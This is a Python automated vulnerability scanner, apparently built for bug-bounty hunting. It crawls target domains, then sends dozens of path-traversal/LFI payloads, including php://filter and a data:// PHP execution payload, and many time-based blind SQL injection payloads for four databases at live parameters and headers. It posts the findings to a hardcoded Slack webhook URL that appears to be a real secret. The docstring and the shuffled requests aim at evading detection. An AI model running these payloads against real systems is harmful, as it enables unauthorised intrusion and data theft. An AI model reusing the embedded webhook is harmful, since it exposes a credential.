#!/usr/bin/env python3
"""
P1-URLs: A Framework for Turning Recon into Results.

The goal of this project is to bridge the gap between initial reconnaissance and
confirmed, high-impact findings. It achieves this by automating a sophisticated
workflow that prioritizes evasion, accuracy, and speed.

From bulk URL discovery to multi-vector, time-based SQLi and dynamic LFI analysis,
every stage is designed to operate at maximum efficiency while minimizing the
chance of detection. Real-time alerting ensures that critical findings are delivered
the moment they are discovered.
"""

import subprocess
import argparse
import os
import re
import shutil
import sys
import time
import random
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from difflib import SequenceMatcher
from rich.console import Console
from rich.panel import Panel
import requests
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================================================================
# === Config (Unchanged) ===
# ==============================================================================
SLACK_WEBHOOK = "https://hooks.slack.com/services/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" 

# File paths and tool config
BULK_URLS_OUTPUT = "target_bulk_urls.txt"
DEDUPED_URLS = "unique_urls_filtered.txt"
GF_PATTERNS = ["lfi", "rce", "redirect", "sqli", "ssrf", "ssti", "xss"]
KATANA_CONCURRENCY = 50
CONCURRENCY = 50
TIME_DELAY = 8
REQUEST_TIMEOUT = 12
CLEAN_BASE_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Language": "en-US,en;q=0.9"}
HEADERS_TO_TEST = ["User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "Origin", "CF-Connecting-IP"]
METHODS_TO_TEST = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
LFI_SIMILARITY_THRESHOLD = 0.9 
LFI_CONFIDENCE_STRINGS = {"Linux /etc/passwd": r"root:(x|\*|\$[^:]*):0:0:","Windows boot.ini": r"\[boot loader\]|\[operating systems\]","PHP data:// Wrapper Exec": r"40212b72c3a51610a26e848608871439","Base64 Linux /etc/passwd": r"cm9vdDo="}
DEFAULT_LFI_PAYLOADS = ["../../../../../../../../etc/passwd","/etc/passwd","../../../../../../../../windows/win.ini","/windows/win.ini","c:\\boot.ini","..\\..\\..\\boot.ini","../../../../../../../../etc/passwd%00","../../../../../../../../boot.ini%00","..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","php://filter/convert.base64-encode/resource=/etc/passwd","php://filter/resource=/etc/passwd","php://filter/read=string.rot13/resource=/etc/passwd","data:text/plain;base64,PD9waHAgZWNobyBtZDUoJ3AxbmN1c3RvbScpOyA/Pg==","L2V0Yy9wYXNzd2Q=","//..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/etc/passwd","///////../../../etc/passwd","../../../../../../../../../../../../../etc/passwd","//////////////////../../../../../../../../etc/passwd",".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd","%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd","file:/etc/passwd", "file:///etc/passwd"]
for i in range(2, 20): DEFAULT_LFI_PAYLOADS.extend([('../' * i) + 'etc/passwd', ('../' * i) + 'windows/win.ini', ('%2e%2e/' * i) + 'etc/passwd'])
BLIND_SQLI_PAYLOADS = {"MySQL": ["{val}' AND SLEEP({delay})-- -", "{val}\" AND SLEEP({delay})-- -", "{val}' AND SLEEP({delay}) AND ('1'='1", "{val} AND SLEEP({delay})", "{val}' AND BENCHMARK({delay}*1000000,MD5('1'))-- -", "{val} AND (SELECT * from (SELECT(SLEEP({delay})))a)", "{val}' AND IF(1=1,SLEEP({delay}),0)-- -", "{val}' XOR (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -", "{val}' XOR IF(NOW()=SYSDATE(),SLEEP({delay}),0) XOR '1", "0'XOR(if(now()=sysdate(),sleep({delay}),0))OR'1", "0\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"1", "{val}*SLEEP({delay})"], "PostgreSQL": ["';SELECT pg_sleep({delay})--", "'||(SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE 'a' END)--", "'OR 1=(SELECT CASE WHEN (1=1) THEN PG_SLEEP({delay}) ELSE NULL END)--", "'AND(CASE WHEN(SUBSTRING(version(),1,1)='P') THEN(SELECT 4564 FROM PG_SLEEP({delay})) ELSE 4564 END)=4564--", "1 AND CAST(pg_sleep({delay}) AS varchar) IS NULL", "1' AND (SELECT 1)=(SELECT 1) XOR (SELECT pg_sleep({delay})) IS NULL--"], "MSSQL": ["';WAITFOR DELAY '0:0:{delay}'--", "\";WAITFOR DELAY '0:0:{delay}'--", "1';IF(1=1) WAITFOR DELAY '0:0:{delay}'--", "1' OR 1=(SELECT 1 WHERE 1=1^0); WAITFOR DELAY '0:0:{delay}'--"], "Oracle": ["{val}' AND DBMS_LOCK.SLEEP({delay})-- -", "'{val}'||DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", "{val}' AND (SELECT 1 FROM DUAL WHERE 1=DECODE(1,1,DBMS_LOCK.SLEEP({delay}),0))>0--", "'; BEGIN DBMS_LOCK.SLEEP({delay}); END;--"]}

console = Console()

# ==============================================================================
# === Helper & Core Functions ===
# ==============================================================================

def print_banner():
    def typewriter_effect(text, delay=0.01):
        for char in text: sys.stdout.write(char); sys.stdout.flush(); time.sleep(delay)
        print()
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print("[bold cyan]Booting P1-URLs Scanner...[/bold cyan]"); time.sleep(0.5)
    ascii_art_lines = ["██████╗  ██╗    ██████╗ ██████╗ ██╗     ███████╗","██╔══██╗ ██║    ██╔══██╗██╔══██╗██║     ██╔════╝","██████╔╝ ██║    ██║  ██║██████╔╝██║     ███████╗","██╔═══╝  ██║    ██║  ██║██╔══██╗██║     ╚════██║","██║      ███████╗██████╔╝██║  ██║███████╗███████║","╚═╝      ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝"]
    console.print("\n[bold red]Initializing Mainframe...[/bold red]")
    for line in ascii_art_lines: console.print(f"[bold cyan]{line}[/bold cyan]", highlight=False); time.sleep(0.05)
    subtitle_text = "\n[yellow]v1.5.3 with Dual Reporting[/yellow]\n"; typewriter_effect(subtitle_text, delay=0.02)
    time.sleep(0.5)
    final_footer = "[bold green]by bugcrowd.com/realvivek[/]  [dim]|[/]  [bold sky_blue3]x.com/starkcharry[/]"
    panel = Panel("\n".join(f"[bold cyan]{line}[/bold cyan]" for line in ascii_art_lines) + subtitle_text,
                  title="[bold red]P1 URLs[/]", subtitle=final_footer, subtitle_align="right", border_style="blue", padding=(1, 2))
    os.system('cls' if os.name == 'nt' else 'clear'); console.print(panel); time.sleep(0.5)

def send_status_update(message):
    try: requests.post(SLACK_WEBHOOK, json={"text": message}, timeout=5, verify=False)
    except requests.RequestException: pass

def check_dependencies():
    console.print("[bold yellow][*] Checking for required tools...[/]")
    tools = ["katana", "uro", "gf", "nuclei"]
    all_found = True
    for tool in tools:
        if not shutil.which(tool):
            console.print(f"[bold red][!] Tool not found in PATH:[/] {tool}"); all_found = False
    if not all_found: console.print("[bold red][!] Please install the missing tools.[/]"); exit(1)
    console.print("[bold green][✔] All tools are installed.[/]")

# --- NEW: Master reporting function ---
def report_and_log(title, details, log_file, severity="CRITICAL"):
    """Prints details to console, sends Slack alert, and logs to a file."""
    
    # 1. Print to Console
    console.print(Panel(
        f"[bold white]{title}[/bold white]\n" + "\n".join(f"[bold cyan]• {key}:[/bold cyan] [white]{value}[/white]" for key, value in details.items()),
        border_style="bold green",
        expand=False
    ))

    # 2. Send to Slack
    slack_message = (f"🚨 *{title}*\n" f"• *Severity:* `{severity}`\n")
    for key, value in details.items():
        if 'Payload' in key: slack_message += f"• *{key}:* ```{value}```\n"
        else: slack_message += f"• *{key}:* `{value}`\n"
    try: requests.post(SLACK_WEBHOOK, json={"text": slack_message}, timeout=10, verify=False)
    except requests.RequestException as e: console.print(f"[red]Slack alert failed: {e}[/red]")
    
    # 3. Log to file
    with open(log_file, "a") as f:
        f.write(json.dumps({"title": title, "severity": severity, **details}) + "\n")


def run_command(command, stdin_data=None):
    try: return subprocess.run(command, input=stdin_data, capture_output=True, text=True, check=False).stdout
    except FileNotFoundError: console.print(f"[bold red][!] Command not found: {command[0]}.[/]"); return None

def gather_urls(input_file, output_file):
    # This function is unchanged from the previous stable version
    console.print("[bold cyan]Step 1: Gathering URLs with Katana (Bulk Mode)[/]")
    with open(input_file) as f: domains = f.read()
    if not domains.strip(): console.print("[yellow][!] Input file is empty.[/yellow]"); Path(output_file).touch(); return
    domain_count = len(domains.strip().split('\n'))
    console.print(f"[*] Beginning bulk crawl on {domain_count} domains with concurrency of {KATANA_CONCURRENCY}...")
    katana_cmd = ["katana", "-silent", "-nc", "-jc", "-kf", "-fx", "-xhr", "-ef", "woff,css,png,svg,jpg,woff2,jpeg,gif,svg", "-c", str(KATANA_CONCURRENCY)]
    katana_result = run_command(katana_cmd, stdin_data=domains)
    if katana_result:
        with open(output_file, 'w') as out: out.write(katana_result)
        console.print(f"[bold green][✔] Katana bulk scan complete.[/bold green]")
    else: console.print("[bold yellow][-] Katana found no URLs from the provided list.[/bold yellow]"); Path(output_file).touch()


def run_uro(input_file, output_file):
    console.print("\n[bold cyan]Step 2: Deduplicating URLs[/]")
    with open(input_file) as f: raw_urls = f.read()
    if not raw_urls.strip(): console.print("[yellow][-] No URLs to deduplicate. Skipping.[/yellow]"); Path(output_file).touch(); return
    uro_result = run_command(["uro"], stdin_data=raw_urls)
    with open(output_file, "w") as out:
        if uro_result: out.write(uro_result)
    found_count = len(uro_result.strip().split('\n')) if uro_result and uro_result.strip() else 0
    console.print(f"[bold green][✔] URL deduplication complete. Unique URLs found: {found_count}[/bold green]")

def run_gf(input_file, output_dir, basefile):
    console.print("\n[bold cyan]Step 3: Classifying URLs with GF[/]")
    if not Path(input_file).exists() or Path(input_file).stat().st_size == 0:
        console.print("[yellow][-] No URLs to classify. Skipping.[/yellow]"); return
    with open(input_file) as f: urls_to_classify = f.read()
    for pattern in GF_PATTERNS:
        console.print(f"  [>] Running gf for pattern: {pattern}")
        result = run_command(["gf", pattern], stdin_data=urls_to_classify)
        if result and result.strip():
            output_file = Path(output_dir) / f"{basefile}_{pattern}.txt"
            with open(output_file, "w") as out: out.write(result)
            console.print(f"    [bold green][✔] Found {len(result.splitlines())} potential '{pattern}' URLs.[/bold green]")
    console.print("[bold green][✔] GF classification complete.[/bold green]")


def check_lfi_payload(session, base_content, param, lfi_payload, query_params, parsed_url):
    malicious_url = urlunparse(parsed_url._replace(query=urlencode({**query_params, param: lfi_payload}, doseq=True)))
    try:
        attack_resp = session.get(malicious_url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False); attack_content = attack_resp.text
        if SequenceMatcher(None, base_content, attack_content).ratio() < LFI_SIMILARITY_THRESHOLD:
            for rule_name, pattern in LFI_CONFIDENCE_STRINGS.items():
                if re.search(pattern, attack_content, re.IGNORECASE):
                    return {"url": malicious_url, "param": param, "rule": rule_name, "payload": lfi_payload}
    except requests.RequestException: pass
    return None

def test_lfi_dynamically(lfi_urls_file, args, lfi_results_file):
    console.print("\n[bold cyan]Step 4: Advanced LFI Testing (Concurrent & Dynamic)[/]")
    if not lfi_urls_file.exists() or lfi_urls_file.stat().st_size == 0:
        console.print("[yellow][-] No potential LFI URLs to test. Skipping.[/yellow]"); return
    lfi_payloads = DEFAULT_LFI_PAYLOADS
    if args.lfi_payloads:
        with open(Path(args.lfi_payloads)) as f: lfi_payloads = [line.strip() for line in f if line.strip()]
    with open(lfi_urls_file) as f: urls_to_test = [line.strip() for line in f if line.strip()]
    console.print(f"[*] Testing {len(urls_to_test)} LFI URLs (Concurrency: {CONCURRENCY})...")
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        for i, url in enumerate(urls_to_test):
            console.print(f"\n[bold]Testing URL ({i+1}/{len(urls_to_test)}):[/] [cyan]{url}[/]")
            try:
                session = requests.Session(); base_resp = session.get(url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False); base_content = base_resp.text
            except requests.RequestException as e: console.print(f"  [!] Failed to get baseline for {url}: {e}"); continue
            
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query, keep_blank_values=True)
            for param in query_params:
                futures = {executor.submit(check_lfi_payload, session, base_content, param, payload, query_params, parsed_url): payload for payload in lfi_payloads}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        details = {"Vulnerable URL": result['url'], "Parameter": result['param'], "Detection Rule": result['rule'], "Payload Used": result['payload']}
                        report_and_log("Vivek - LFI Vulnerability Found", details, lfi_results_file, severity="HIGH")
                        for f in futures: f.cancel(); break
    console.print(f"[bold green][✔] Concurrent LFI scan complete.[/bold green]")


def check_sqli_payload(url, method, payload, injection_point_type, injection_point_name, db_name):
    headers, malicious_url = CLEAN_BASE_HEADERS.copy(), url
    if injection_point_type == "Parameter": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode({**parse_qs(urlparse(url).query, keep_blank_values=True), injection_point_name: payload}, doseq=True)))
    elif injection_point_type == "Parameter-HPP": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode(list(parse_qs(urlparse(url).query, keep_blank_values=True).items()) + [(injection_point_name, payload)], doseq=True)))
    elif injection_point_type == "Header": headers[injection_point_name] = payload
    if _check_sqli_vulnerability(malicious_url, method, headers):
        return {"url": url, "db": db_name, "payload": payload, "details": {"Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method}}
    return None

def _check_sqli_vulnerability(target_url, method, headers):
    try: requests.request(method.upper(), target_url, headers=headers, data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None, timeout=(TIME_DELAY + 2), verify=False)
    except requests.exceptions.Timeout: return True
    except requests.exceptions.RequestException: pass
    return False

def test_blind_sqli(sqli_urls_file, blind_sqli_results_file):
    console.print("\n[bold cyan]Step 5: Advanced Blind SQLi Testing (Concurrent & Evasive)[/]")
    if not sqli_urls_file.exists() or sqli_urls_file.stat().st_size == 0:
        console.print("[yellow][-] No potential SQLi URLs to test. Skipping.[/yellow]"); return
    with open(sqli_urls_file) as f: urls = [line.strip() for line in f if line.strip()]
    random.shuffle(urls)
    num_urls = len(urls)
    send_status_update(f"⚙️ `[5/6]` Starting advanced Blind SQLi testing on *{num_urls}* potential URLs.\n> This is the most time-intensive phase.")
    console.print(f"[*] Found and shuffled {num_urls} potential SQLi URLs to test concurrently...")
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        for i, url in enumerate(urls):
            if num_urls > 10 and (i + 1) % (num_urls // 10 or 1) == 0:
                progress = ((i + 1) / num_urls) * 100
                send_status_update(f"   ...SQLi testing is *{progress:.0f}%* complete ({i+1}/{num_urls} URLs checked).")
            console.print(f"\n[bold]Testing URL ({i+1}/{len(urls)}):[/] [cyan]{url}[/]")
            tasks = []; parsed_url = urlparse(url); original_params = parse_qs(parsed_url.query, keep_blank_values=True)
            for param, values in original_params.items():
                for db_name, payloads in BLIND_SQLI_PAYLOADS.items():
                    for payload_template in payloads:
                        tasks.append(executor.submit(check_sqli_payload, url, "GET", payload_template.format(delay=TIME_DELAY, val=(values[0] if values else "")), "Parameter", param, db_name))
                        tasks.append(executor.submit(check_sqli_payload, url, "GET", payload_template.format(delay=TIME_DELAY, val=(values[0] if values else "")), "Parameter-HPP", param, db_name))
            methods_to_try = list(METHODS_TO_TEST); random.shuffle(methods_to_try)
            for method in methods_to_try:
                headers_to_try = list(HEADERS_TO_TEST); random.shuffle(headers_to_try)
                for header in headers_to_try:
                    for db_name, payloads in BLIND_SQLI_PAYLOADS.items():
                        for payload_template in payloads:
                            tasks.append(executor.submit(check_sqli_payload, url, method, payload_template.format(delay=TIME_DELAY, val=""), "Header", header, db_name))
            console.print(f"  [>] Submitted {len(tasks)} potential SQLi checks to the thread pool...")
            for future in as_completed(tasks):
                result = future.result()
                if result:
                    details = {"URL": result['url'],"Injection Point": result['details']['Injection Point'],"Method": result['details']['Method'],"Detected DB": result['db'],"Payload Used": result['payload']}
                    report_and_log("Vivek - Blind SQLi Vulnerability Found", details, blind_sqli_results_file)
                    for task in tasks: task.cancel()
                    break
    console.print(f"[bold green][✔] Concurrent Blind SQLi scan complete.[/bold green]")


def run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_findings_file):
    console.print("\n[bold cyan]Step 6: Scanning with Nuclei (Other Patterns)[/]")
    for pattern in GF_PATTERNS:
        if pattern in ['sqli', 'lfi']: continue
        file_path = Path(gf_dir) / f"{basefile}_{pattern}.txt"
        if not file_path.exists() or file_path.stat().st_size == 0: continue
        console.print(f"[*] Starting Nuclei scan for: [bold magenta]{pattern}[/]")
        output_path = Path(nuclei_dir) / f"{basefile}_{pattern}_nuclei.jsonl"
        nuclei_cmd = ["nuclei", "-l", str(file_path), "-jsonl", "-o", str(output_path), "-rate-limit", "150", "-tags", pattern, "-silent"]
        run_command(nuclei_cmd)
        if output_path.exists() and output_path.stat().st_size > 0:
            with open(output_path) as f:
                for line in f:
                    try:
                        result = json.loads(line); info = result.get("info", {})
                        details = {"Vulnerability": result.get("template-id", "N/A").upper(), "URL": result.get("matched-at", "N/A"), "Template": info.get("name", "N/A")}
                        report_and_log("Vivek - Nuclei Vulnerability Found", details, nuclei_findings_file, severity=info.get("severity", "N/A").upper())
                    except (json.JSONDecodeError, KeyError): continue
    console.print("[bold green][✔] Nuclei scanning complete.[/bold green]")

def main():
    parser = argparse.ArgumentParser(description="P1-URLs Scanner - v1.5.3")
    parser.add_argument("-l", "--list", required=True, help="Path to a file with subdomains OR a pre-existing list of URLs.")
    parser.add_argument("-u", "--use-urls", action="store_true", help="Use the input file from -l as a direct list of URLs, skipping discovery.")
    parser.add_argument("-p", "--lfi-payloads", help="Optional: Path to a custom LFI payloads file.")
    args = parser.parse_args()
    
    input_file, basefile = Path(args.list), Path(args.list).stem
    if not input_file.is_file(): console.print(f"[red][!] Input file not found:[/] {str(input_file)}"); return
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_dir = Path(f"scan_results_{basefile}_{timestamp}")
    console.print(f"[bold bright_blue]Creating isolated scan directory: {output_dir}[/bold bright_blue]")
    gf_output_dir = output_dir / "gf_results"; os.makedirs(gf_output_dir)
    nuclei_output_dir = output_dir / "nuclei_results"; os.makedirs(nuclei_output_dir)
    
    bulk_urls_output, deduped_urls = output_dir / "target_bulk_urls.txt", output_dir / "unique_urls_filtered.txt"
    lfi_results_file = output_dir / "lfi_vulnerable.json"
    sqli_results_file = output_dir / "blind_sqli_vulnerable.json"
    nuclei_findings_file = output_dir / "nuclei_findings.json"

    with open(input_file) as f: line_count = len(f.readlines())
    
    if args.use_urls:
        workflow_steps, current_step = 5, 2
        send_status_update(f"🚀 *Scan Started (Direct URL Mode)* on `{basefile}` with *{line_count}* URLs.")
        send_status_update(f"⚙️ `[1/{workflow_steps}]` Deduplicating URLs...")
        run_uro(str(input_file), deduped_urls)
        send_status_update(f"⚙️ `[{current_step}/{workflow_steps}]` Classifying URLs...")
        run_gf(deduped_urls, gf_output_dir, basefile)
    else:
        workflow_steps, current_step = 6, 3
        send_status_update(f"🚀 *Scan Started (Discovery Mode)* on `{basefile}` with *{line_count}* domains.")
        send_status_update("⚙️ `[1/6]` Starting URL Gathering...")
        gather_urls(str(input_file), bulk_urls_output)
        send_status_update("⚙️ `[2/6]` Deduplicating URLs...")
        run_uro(bulk_urls_output, deduped_urls)
        send_status_update("⚙️ `[3/6]` Classifying URLs...")
        run_gf(deduped_urls, gf_output_dir, basefile)
    
    current_step += 1
    send_status_update(f"⚙️ `[{current_step}/{workflow_steps}]` Starting LFI Analysis...")
    test_lfi_dynamically(gf_output_dir / f"{basefile}_lfi.txt", args, lfi_results_file)
    
    test_blind_sqli(gf_output_dir / f"{basefile}_sqli.txt", sqli_results_file)
    
    current_step += 1
    send_status_update(f"⚙️ `[{current_step}/{workflow_steps}]` Scanning other patterns with Nuclei...")
    run_nuclei(gf_output_dir, nuclei_output_dir, basefile, nuclei_findings_file)
        
    console.print(f"\n[bold green][✔] All tasks complete! Results are in the directory: {output_dir}[/bold green]")
    send_status_update(f"✅ *Scan Complete* for `{basefile}`. Results saved in `{output_dir}`.")

if __name__ == "__main__":
    print_banner(); check_dependencies(); main()
